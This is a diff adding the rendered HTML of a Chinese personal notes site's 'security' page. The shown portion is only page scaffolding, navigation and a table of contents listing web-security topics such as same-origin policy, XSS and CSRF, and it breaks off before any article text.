@@ -1,0 +1,2535 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="非法操作">
+      
+      
+        <link rel="canonical" href="https://hjlarry.github.io/other/security/">
+      
+      
+        <link rel="prev" href="../shell/">
+      
+      
+        <link rel="next" href="../oop/">
+      
+      
+      <link rel="icon" href="../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.9">
+    
+    
+      
+        <title>security - 非法操作的笔记</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.f2e4d321.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep-orange" data-md-color-accent="deep-orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#web-security" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="非法操作的笔记" class="md-header__button md-logo" aria-label="非法操作的笔记" data-md-component="logo">
+      
+  <img src="../../assets/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            非法操作的笔记
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              security
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-orange" data-md-color-accent="deep-orange"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-orange" data-md-color-accent="white"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hjlarry/hjlarry.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hjlarry/hjlarry.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="非法操作的笔记" class="md-nav__button md-logo" aria-label="非法操作的笔记" data-md-component="logo">
+      
+  <img src="../../assets/logo.png" alt="logo">
+
+    </a>
+    非法操作的笔记
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hjlarry/hjlarry.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hjlarry/hjlarry.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    计算机基础
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            计算机基础
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sicp/hardware/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    硬件
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sicp/software/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    软件
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sicp/program/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    程序
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sicp/asm/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    汇编
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    GO语言
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            GO语言
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../go/map/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    字典
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../go/closure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    闭包
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../go/defer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    延迟调用
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../go/goroutine/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    并发调度
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../go/alloc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    内存分配
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../go/gc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    垃圾回收
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../go/lock/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    锁
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Python语言
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Python语言
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../python/memory/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    内存管理
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../python/interpreter/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    解释器
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../python/tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    技巧工具
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    MySQL
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            MySQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mysql/query/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    查询
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mysql/theory/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    原理
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    其他
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            其他
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ai/gai/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AI
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../git/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    git
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../docker/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    docker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../raft/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    raft
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    shell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    security
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    security
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#same-origin-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Same Origin Policy
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Same Origin Policy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#definition" class="md-nav__link">
+    <span class="md-ellipsis">
+      Definition
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cookie
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe" class="md-nav__link">
+    <span class="md-ellipsis">
+      iframe
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ajax" class="md-nav__link">
+    <span class="md-ellipsis">
+      AJAX
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AJAX">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jsonp" class="md-nav__link">
+    <span class="md-ellipsis">
+      JSONP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#websocket" class="md-nav__link">
+    <span class="md-ellipsis">
+      WebSocket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cors" class="md-nav__link">
+    <span class="md-ellipsis">
+      CORS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session Attack
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Session Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session-and-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session and Cookie
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session hijacking
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Session hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#over-http-steal-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Over Http steal cookie
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-steal-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS steal cookie
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSRF
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Type
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Example
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Example">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#html-elements" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML elements
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-attributes" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML attributes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-elements" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script elements
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#never-safe-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Never safe context
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-defenses" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS defenses
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
